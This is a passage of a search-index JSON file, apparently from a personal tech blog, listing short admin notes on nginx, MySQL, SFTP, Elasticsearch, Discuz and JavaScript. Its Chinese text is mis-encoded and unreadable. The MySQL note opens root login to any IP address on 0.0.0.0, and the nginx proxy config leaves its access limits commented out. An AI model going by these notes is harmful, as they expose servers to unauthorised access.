lua-develsudo apt-get install libluajit-5.1-devhttp://stackoverflow.com/questio â€¦ h-lua-on-rpm-system","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"Linux é…ç½®æƒé™å—é™åˆ¶çš„SFTPç”¨æˆ·","slug":"history/tech/5953c4d0c2b92f5665eed952","date":"2015-12-09T02:23:21.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed952/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed952/","excerpt":"","text":"http://be-evil.org/how-to-restrict-lime-sftp-user.htmlhttp://www.zhukun.net/archives/7641http://itindex.net/detail/50730-ssh-sftphttp://www.chinaunix.net/old_jh/4/701381.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"è·å–å½“å‰script","slug":"history/tech/5953c4d0c2b92f5665eed951","date":"2015-12-09T02:21:17.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed951/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed951/","excerpt":"","text":"function getCurrentScript() {if (document.currentScript) {return document.currentScript;}// For IE6-9 browsers, the script onload event may not fire right // after the script is evaluated. Kris Zyp found that it // could query the script nodes and the one that is in &quot;interactive&quot; // mode indicates the current script // ref: http://goo.gl/JHfFW var scripts = document.getElementsByTagName(&quot;script&quot;) for (var i = scripts.length - 1; i &gt;= 0; i--) { var script = scripts if (script.readyState === &quot;interactive&quot;) { interactiveScript = script return interactiveScript } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"nginx é…ç½®ä»£ç†æœåŠ¡å™¨","slug":"history/tech/5953c4d0c2b92f5665eed950","date":"2015-12-09T02:02:58.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed950/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed950/","excerpt":"","text":"nginx é…ç½®ä»£ç†æœåŠ¡å™¨server { listen 8090; resolver 8.8.8.8; location /{ #proxy_pass http://$http_host$request_uri; proxy_pass $scheme://$host$request_uri; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; client_max_body_size 100m; #allow 127.0.0.1; #deny all; } access_log /var/log/nginx/proxy-access.log; error_log /var/log/nginx/proxy-error.log; }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"mysql å®‰è£…å®Œæ¯•æ— æ³•ç™»é™†","slug":"history/tech/5953c4d0c2b92f5665eed959","date":"2015-12-09T01:35:31.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed959/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed959/","excerpt":"","text":"mysql&gt; use mysql;mysql&gt; select host,user from user;mysql&gt; update user set host = â€˜%â€™ where user = â€˜rootâ€™;mysql&gt; select host,user from user;mysql&gt; flush privileges;rootå¯¹åº”çš„hostæˆäº†%,è¡¨ç¤ºå¯ä»¥ä»»æ„IPåœ°å€ç™»å½•äº†.è¿˜éœ€ä¿®æ”¹my.cnfbind-address = 0.0.0.0","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"jsä¹‹äº‹ä»¶å†’æ³¡å’Œäº‹ä»¶æ•è·","slug":"history/tech/5953c4d0c2b92f5665eed94e","date":"2015-12-08T04:53:20.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed94e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed94e/","excerpt":"","text":"jsä¹‹äº‹ä»¶å†’æ³¡å’Œäº‹ä»¶æ•è·","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"REPLACE INTO common_connect_guest SET `conuintoken`='xxxxxxx''","slug":"history/tech/5953c4d0c2b92f5665eed94d","date":"2015-12-08T04:45:40.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed94d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed94d/","excerpt":"","text":"REPLACE INTO common_connect_guest SET conuintoken=â€˜xxxxxxxâ€™'è§£å†³æ–¹æ¡ˆï¼šALTER TABLE pre_common_member_connect ADD COLUMN conuintoken char(32) NOT NULL DEFAULT â€˜â€™;ALTER TABLE pre_common_connect_guest ADD COLUMN conuintoken char(32) NOT NULL DEFAULT â€˜â€™;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"discuz","slug":"discuz","permalink":"https://wangxiuwen.github.io/tags/discuz/"}],"author":"wangxiuwen"},{"title":"elasticsearch å¯åŠ¨å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eed94f","date":"2015-12-07T17:16:44.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed94f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed94f/","excerpt":"","text":"æˆ‘ä»¬å¯ä»¥è¦†ç›–é›†ç¾¤æˆ–è€…èŠ‚ç‚¹çš„åå­—ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å¯åŠ¨Elasticsearchçš„æ—¶å€™é€šè¿‡å‘½ä»¤è¡Œæ¥æŒ‡å®šï¼Œå¦‚ä¸‹ï¼š./elasticsearch --cluster.name my_cluster_name --node.name my_node_name$ elasticsearch-1.6.0/bin/elasticsearch -Des.node.name=QIANRUSHI -Des.http.port=8888 -d","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"}]}